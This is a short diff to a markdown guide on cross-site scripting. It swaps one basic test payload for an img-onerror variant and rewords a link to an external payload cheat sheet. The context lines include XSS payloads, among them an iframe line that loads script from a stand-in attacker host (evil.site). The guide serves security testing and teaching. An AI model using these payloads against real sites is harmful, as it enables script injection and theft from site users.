@@ -67,7 +67,7 @@ XSS (Cross-Site Scripting) is an injection vulnerability where attackers execute
 ### Basic Tests  
 ```html
 <script>alert(1)</script>
-"><svg/onload=confirm(1)>
+<img src=x onerror="alert(1)">
 ```  
 
 ### Advanced Attacks  
@@ -79,7 +79,7 @@ XSS (Cross-Site Scripting) is an injection vulnerability where attackers execute
 <iframe src="javascript:document.write('<script src=//evil.site/xss.js></script>')">
 ```  
 
-📖 Full Cheat Sheet: [XSS Payload Masterlist](https://gist.github.com/kurobeats/9a613c9ab68914312cbb415134795b45)  
+📖 Here is a cool Cheat Sheet: [XSS Payload Masterlist](https://gist.github.com/kurobeats/9a613c9ab68914312cbb415134795b45)  
 
 ---
 
